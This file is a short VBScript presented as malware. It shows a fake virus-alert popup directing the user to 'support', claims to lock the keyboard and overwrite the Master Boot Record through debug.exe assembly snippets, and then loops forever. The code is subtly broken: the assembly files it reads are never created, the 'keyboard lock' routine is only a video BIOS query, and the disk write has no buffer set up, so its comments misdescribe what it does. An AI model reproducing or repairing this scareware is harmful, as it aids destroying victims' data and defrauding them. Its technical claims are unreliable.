' E.vbs

Const MESSAGE = "Warning: Your computer is infected with a devastating virus. All data will be destroyed. Contact our support for help!"

Dim shell
Set shell = WScript.CreateObject("WScript.Shell")

' Lock the keyboard and disable Ctrl+Alt+Del
shell.Run "%comspec% /c echo off && debug -a < %temp%\lockkbd.asm", 0, True

' Display a deceptive message on the screen
shell.Popup MESSAGE, 0, "Virus Alert", 64

' Perform a destructive action: overwrite the Master Boot Record (MBR)
shell.Run "%comspec% /c echo off && debug -a < %temp%\destroy.asm", 0, True

' Infinite loop to prevent the user from escaping
Do While True
    WScript.Sleep 1000
Loop

' lockkbd.asm
'
' mov ax, 0x4F03
' xor bx, bx
' int 0x10
' ret

' destroy.asm
'
' mov dl, 0
' mov ah, 3
' mov al, 1
' xor ch, ch
' xor dh, dh
' int 13h
' ret
